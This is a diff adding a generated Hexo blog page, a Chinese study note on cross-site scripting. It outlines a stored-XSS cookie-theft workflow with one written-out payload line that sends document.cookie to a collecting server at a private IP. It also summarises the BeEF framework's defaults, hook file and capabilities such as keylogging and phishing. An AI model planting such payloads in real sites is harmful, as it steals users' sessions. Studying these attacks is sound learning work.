@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>9.27学习笔记 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="XSS跨站脚本攻击 存储型xss攻击：获取cookie1.构建收集cookie的服务器2.构造xss代码并植入web服务器3.等待受害者触发xss代码并将cookie发送到收集服务器4.利用cookie植入代码：&amp;lt;\script&amp;gt;window.open(‘192.168.106.140&#x2F;cookie_rec.php?cookie=’+doucument.cookie)&amp;lt;&#x2F;scri">
+<meta property="og:type" content="article">
+<meta property="og:title" content="9.27学习笔记">
+<meta property="og:url" content="https:&#x2F;&#x2F;cq-sky.github.io&#x2F;2019&#x2F;10&#x2F;20&#x2F;9.28&#x2F;index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="XSS跨站脚本攻击 存储型xss攻击：获取cookie1.构建收集cookie的服务器2.构造xss代码并植入web服务器3.等待受害者触发xss代码并将cookie发送到收集服务器4.利用cookie植入代码：&amp;lt;\script&amp;gt;window.open(‘192.168.106.140&#x2F;cookie_rec.php?cookie=’+doucument.cookie)&amp;lt;&#x2F;scri">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-09-28T12:40:50.379Z">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://cq-sky.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-9.28" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/20/9.28/" class="article-date">
+  <time datetime="2019-10-20T14:20:31.492Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      9.27学习笔记
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>XSS跨站脚本攻击</p>
+<h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>攻击：获取cookie<br>1.构建收集cookie的服务器<br>2.构造xss代码并植入web服务器<br>3.等待受害者触发xss代码并将cookie发送到收集服务器<br>4.利用cookie<br>植入代码：&lt;\script&gt;window.open(‘192.168.106.140/cookie_rec.php?cookie=’+doucument.cookie)&lt;/script&gt;<br><by></p>
+<h3 id="自动化xss"><a href="#自动化xss" class="headerlink" title="自动化xss"></a>自动化xss</h3><p>BeEF:<br>BeEF(Browser Exploitation Framework)目前最强大的浏览器开源渗透测试框架，通过xss漏洞配合js脚本和metasploit来进行渗透，基于Ruby语言编写的，支持图形化界面<br>基于apache来提供页面访问，默认监听在127.0.0.1(本机)的3000端口，默认用户名、密码：beef<br><by><br>功能：<br>信息收集：<br>网络发现、主机信息、Cookie获取、会话劫持、键盘记录、插件信息<br><by><br>持久化控制：<br>确认弹框、小窗口、中间人<br><by><br>社工：<br>点击劫持、弹窗告警、虚假页面、钓鱼页面<br><by><br>渗透攻击：<br>内网渗透、metasploit、CSRF（跨站请求伪造）攻击、DDOS攻击<br><by><br>通过http:// ip：3000\ui\panel 来访问页面<br>钩子文件为：hook.js<br><by><br>资料链接：<br><a href="https://www.bilibili.com/video/av46483006" target="_blank" rel="noopener">bilibili</a><br><a href="https://blog.csdn.net/qq_36119192/article/details/82731839" target="_blank" rel="noopener">CSDN（BeEF的使用）</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cq-sky.github.io/2019/10/20/9.28/" data-id="ck1z2w7qo0009kkvke3pb1xwo" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/10/20/9.27/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          9.27学习笔记
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/20/9.23/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">9.23学习笔记</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/10/20/10.17/">学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/10.9/">学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/10.2/">近期学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/10.4/">近期学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/9.27/">9.27学习笔记</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 cq-sky<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
